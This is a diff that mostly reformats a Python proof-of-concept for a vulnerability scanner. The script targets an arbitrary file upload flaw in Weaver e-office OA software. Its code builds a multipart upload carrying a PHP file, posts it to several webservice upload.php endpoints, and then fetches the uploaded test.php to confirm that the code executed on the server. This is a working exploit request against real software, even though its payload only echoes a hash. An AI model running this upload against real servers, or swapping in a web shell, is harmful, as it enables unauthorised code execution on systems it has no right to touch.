@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import time, re
+import time
+import re
+
 
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0032' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0032'  # 平台漏洞编号，留空
     name = '泛微e-office 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-07-11'  # 漏洞公布时间
     desc = '''
         泛微e-cology 多处存在任意文件上传漏洞。
@@ -23,6 +25,7 @@ class Vuln(ABVuln):
     product = '泛微OA'  # 漏洞应用名称
     product_version = '泛微e-office'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'bf336ed9-8377-4b23-88d0-02de13d8d066'
     author = '47bwy'  # POC编写者
@@ -35,8 +38,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
+
+            # refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
             hh = hackhttp.hackhttp()
             arg = self.target
             content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVO9PKsatIjWx0zBn'
@@ -49,7 +52,7 @@ class Poc(ABPoc):
                 <?php echo md5(1); ?>
                 ------WebKitFormBoundaryVO9PKsatIjWx0zBn--
             '''
-            #第一处 几处代码相同
+            # 第一处 几处代码相同
             urls = [
                 arg + '/webservice/upload.php',
                 arg + '/webservice/upload/upload.php',
@@ -57,13 +60,15 @@ class Poc(ABPoc):
                 arg + '/webservice-xml/upload/upload.php'
             ]
             for url in urls:
-                code, head, res, err, _ = hh.http(url, header=content_type, post=post)
-                
+                code, head, res, err, _ = hh.http(
+                    url, header=content_type, post=post)
+
                 if code == 200:
                     m = re.search(r'([\d]*)\*test.php', res)
                     if m:
-                        code, head, res, err, _ = hh.http(arg + '/attachment/' + m.group(1) + '/test.php')
-                        if (code==200) and (md5_1 in res):
+                        code, head, res, err, _ = hh.http(
+                            arg + '/attachment/' + m.group(1) + '/test.php')
+                        if (code == 200) and (md5_1 in res):
                             #security_hole('Arbitrarily file upload: ' + url)
                             self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                                 target=self.target, name=self.vuln.name, url=url))
@@ -73,6 +78,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
